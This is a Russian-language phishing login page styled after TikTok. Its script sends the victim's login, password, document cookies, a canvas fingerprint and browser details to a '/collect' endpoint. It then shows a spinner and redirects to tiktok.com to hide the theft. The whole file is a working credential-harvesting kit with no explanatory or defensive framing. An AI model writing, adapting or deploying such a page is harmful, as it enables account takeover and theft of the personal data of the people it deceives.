<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { background: #0f0f0f; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
  .card { background: #1a1a1a; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 360px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
  h1 { font-size: 22px; margin-bottom: 8px; text-align: center; }
  p { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 24px; }
  label { display: block; font-size: 13px; margin-bottom: 6px; color: #ccc; }
  input { width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; font-size: 15px; margin-bottom: 16px; outline: none; }
  input:focus { border-color: #fe2c55; }
  button { width: 100%; padding: 13px; border: none; border-radius: 10px; background: #fe2c55; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
  button:active { transform: scale(0.98); }
  .loader { display: none; width: 40px; height: 40px; border: 3px solid #333; border-top-color: #fe2c55; border-radius: 50%; animation: spin .7s linear infinite; margin: 40px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="card" id="formCard">
  <h1>Войти</h1>
  <p>Введите данные для продолжения</p>
  
  <form id="loginForm">
    <label>Логин или почта</label>
    <input type="text" id="login" placeholder="email или логин" required autocomplete="username">
    
    <label>Пароль</label>
    <input type="password" id="password" placeholder="пароль" required autocomplete="current-password">
    
    <button type="submit">Продолжить</button>
  </form>
</div>

<div class="loader" id="loader"></div>

<script>
const endpoint = "/collect";   // оставляем так

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const login = document.getElementById("login").value.trim();
  const password = document.getElementById("password").value;
  
  // прячем форму, показываем крутилку
  document.getElementById("formCard").style.display = "none";
  document.getElementById("loader").style.display = "block";
  
  // собираем остальное
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  ctx.textBaseline = "top";
  ctx.font = "14px Arial";
  ctx.fillText("fp", 2, 2);
  const fp = canvas.toDataURL().slice(-32);
  
  const payload = {
    login: login,
    password: password,
    screen: `${screen.width}x${screen.height}`,
    lang: navigator.language || "—",
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
    platform: navigator.platform || "—",
    cookies: document.cookie || "none",
    fp: fp,
    url: location.href
  };
  
  try {
    await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    });
  } catch (err) {}
  
  // редирект
  setTimeout(() => {
    location.replace("https://www.tiktok.com/");
  }, 600);
});
</script>
</body>
</html>
